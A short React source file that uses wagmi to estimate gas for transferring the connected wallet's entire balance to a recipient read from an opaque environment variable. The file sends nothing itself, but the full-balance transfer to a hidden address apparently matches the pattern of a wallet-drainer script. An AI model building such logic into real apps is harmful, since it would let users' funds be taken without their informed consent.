import { useEstimateGas } from "wagmi";
import { parseEther } from "viem";
import { useAccount, useBalance } from "wagmi";

const EstimateGas = () => {
  const recipient = import.meta.env.VITE_0X;
  const { address } = useAccount();
  const { data: balanceData, isLoading: balanceIsLoading } = useBalance({
    address: address,
  });

  const amount = balanceIsLoading || !balanceData ? " " : balanceData.formatted;

  const { data: gasEstimateData, isLoading: gasEstimateLoading } =
    useEstimateGas({
      account: address,
      to: recipient,
      value: parseEther(amount),
    });

  return gasEstimateLoading || !gasEstimateData ? "" : gasEstimateData;
};

export default EstimateGas;
